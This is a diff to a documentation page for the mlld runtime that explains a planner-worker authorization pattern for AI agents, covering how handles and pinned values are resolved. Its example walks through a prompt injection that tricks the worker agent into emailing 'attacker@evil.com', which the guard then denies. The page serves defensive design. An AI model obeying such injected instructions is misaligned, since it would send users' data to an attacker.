@@ -6,7 +6,7 @@ category: patterns
 tags: [patterns, planner, worker, authorization, agents, handles, facts, security]
 related: [facts-and-handles, policy-authorizations, security-getting-started, labels-attestations, security-guards-basics]
 related-code: [interpreter/eval/exec/policy-fragment.ts, interpreter/utils/handle-resolution.ts, interpreter/fyi/facts-runtime.ts]
-updated: 2026-03-25
+updated: 2026-03-26
 ---
 
 The planner-worker pattern splits agent execution into two phases: a planner that decides what to do and authorizes specific tools and values, and a worker that executes under those constraints.
@@ -93,16 +93,18 @@ var @result = @worker(@task) with { policy: @plannerAuth }
 
 At dispatch time:
 
-1. The runtime resolves `{ "handle": "h_a7x9k2" }` back to `"mark@example.com"` with its original `fact:external:@contact.email` label
+1. The runtime canonicalizes the authorized recipient back to the live value. The strongest path is `{ "handle": "h_a7x9k2" }`, but the exact emitted preview or bare visible value also resolves when the match is unique.
 2. The authorization guard checks: is `sendEmail` allowed? Is `recipient` the pinned value? Yes
 3. The inherited positive check runs: does `recipient` carry `fact:*.email` or `known`? Yes
 4. The call proceeds
 
 If injection tricks the worker into calling `sendEmail(recipient: "attacker@evil.com")`:
 
-1. `"attacker@evil.com"` is a raw literal -- no handle
+1. `"attacker@evil.com"` was never emitted as a projected value, so it stays a raw literal
 2. The authorization guard checks: does this match the pinned value? No
 3. Call denied
+
+If the worker copies a masked preview that uniquely matches a projected contact, mlld canonicalizes it back to the live value before the same authorization and positive checks run. If the preview is ambiguous, the runtime fails closed and tells the model to use the handle wrapper.
 
 ## Key properties
 
@@ -122,6 +124,8 @@ If the planner pins a value that carried `known` or a matching `fact:` label at 
 ### Tolerant comparison
 
 The worker can pass *less* than authorized (fewer recipients) but not *more*. Args not mentioned in the constraint are enforced as empty/null, so silent omission never becomes an open hole.
+
+The runtime does not rewrite arbitrary payloads or tool schemas. Tolerant boundary matching only applies to security-relevant args and only for exact projected forms the runtime emitted.
 
 ### Locked policies
 
